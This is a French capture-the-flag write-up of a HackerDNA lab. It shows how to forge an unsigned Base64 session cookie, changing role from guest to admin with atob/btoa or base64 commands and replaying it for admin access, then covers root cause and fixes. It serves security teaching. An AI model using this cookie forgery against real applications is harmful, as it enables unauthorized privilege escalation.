# Compte rendu : Hack The Cookie
Plateforme : HackerDNA ( https://hackerdna.com/labs/hack-the-cookie )
Catégorie : Sécurité Web et API
Difficulté : Très Facile
Tags : Web, Cookie, Privilège Escalation, Session

## Scénario
Un défi d'empoisonnement de cookies / élévation de privilèges exploitant des données de session non signées et approuvées par le client.

L'application stocke des données d'autorisation sensibles (comme le rôle de l'utilisateur) côté client dans un cookie, sans aucune protection cryptographique telle qu'une signature (HMAC) ou une validation de session côté serveur.

Prérequis : Aucun.

## Chaîne d'Attaque
[Connexion en guest] → [Inspection du cookie user_session] → [Décodage Base64] → [Modification role: guest → admin] → [Ré-encodage Base64] → [Rejeu du cookie forgé] → 🚩 [Accès admin]

## Étape 1 — Reconnaissance
Ouvrir l'application cible et se connecter en tant qu'utilisateur par défaut `guest`.

Ensuite, ouvrir Chrome DevTools :

```
F12 → Onglet Application → Cookies
```

Un cookie nommé `user_session` se démarque par sa valeur : une longue chaîne de caractères ressemblant à du Base64, plutôt qu'un jeton de session opaque (comme un UUID ou un hachage aléatoire).

C'est généralement un signal d'alarme pour ce type de vulnérabilité.

## Étape 2 — Décryptage du cookie
Le décodage Base64 de la valeur `user_session` révèle un objet JSON en clair contenant des attributs utilisateur, dont un champ `role` défini sur `"guest"`.

Exemple de contenu décodé :

```json
{
  "username": "guest",
  "role": "guest"
}
```

Aucune signature HMAC, aucun nonce ni aucune référence côté serveur ne sont présents. Cela signifie que l'application fait confiance au contenu du cookie sans vérification.

Décodage dans la console du navigateur :

```javascript
atob("VOTRE_COOKIE_ICI")
```

Ou en ligne de commande :

```bash
echo "VOTRE_COOKIE_ICI" | base64 -d
```

## Étape 3 — Falsification
Modifier le champ `role` dans le JSON décodé de `guest` à `admin`, en conservant le reste de la structure identique :

```json
{
  "username": "guest",
  "role": "admin"
}
```

Puis ré-encoder le JSON modifié en Base64 :

```javascript
btoa('{"username":"guest","role":"admin"}')
```

```bash
echo -n '{"username":"guest","role":"admin"}' | base64
```

## Étape 4 — Rejeu du cookie forgé
En utilisant l'éditeur de cookies dans DevTools :

```
Application → Cookies → user_session
```

Remplacer la valeur d'origine par le nouveau cookie forgé avec le rôle admin, puis actualiser la page :

```
F5
```

## Étape 5 — Élévation de privilèges confirmée
L'application accepte le cookie falsifié sans aucune validation côté serveur, donnant accès à une zone réservée aux administrateurs et auparavant inaccessible aux utilisateurs invités.

Le flag se trouve dans cette interface d'administration restreinte.

🚩 Flag : FLAG{...}

## Cause Racine
La vulnérabilité provient de l'application qui :

- Stocke des données sensibles d'autorisation (`role`) directement dans un cookie lisible / inscriptible par le client
- Ne signe ni ne chiffre la charge utile de session
- Ne vérifie pas côté serveur le rôle par rapport à une base de données de confiance (par exemple, une recherche dans une base de données par ID de session)

C'est une violation du principe : ne jamais faire confiance au client pour déclarer lui-même son niveau de privilège.

## Outils Utilisés
- Chrome DevTools (Onglet Application, Éditeur de cookies)
- Décodage / Encodage Base64 (console du navigateur `atob()` / `btoa()` ou tout utilitaire Base64 standard)

## Mesures Correctives / Leçons Apprises
- Utiliser des identifiants de session opaques et aléatoires qui font référence à l'état de session côté serveur ; ne jamais intégrer directement les rôles ou les autorisations dans les cookies contrôlés par le client.
- Si les données de session doivent être côté client (par exemple, les JWT), les signer avec un secret détenu par le serveur (HMAC / RSA) et vérifier la signature à chaque requête.
- Configurer les cookies avec les attributs `HttpOnly`, `Secure` et `SameSite` pour réduire l'exposition, même si cela ne suffirait pas à empêcher cette attaque spécifique, car le problème réside dans la falsification et non seulement dans la visibilité.
- Toujours re-vérifier l'autorisation côté serveur ; ne jamais faire confiance aux revendications de rôle / autorisation fournies par le client.

## Conclusion
Ce lab est une excellente illustration, accessible aux débutants, de l'importance des limites de confiance : tout ce qui est stocké ou transmis via le client (cookies, champs de formulaire cachés, localStorage) doit être traité comme une entrée non fiable et validé côté serveur avant d'être utilisé pour les décisions d'autorisation.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
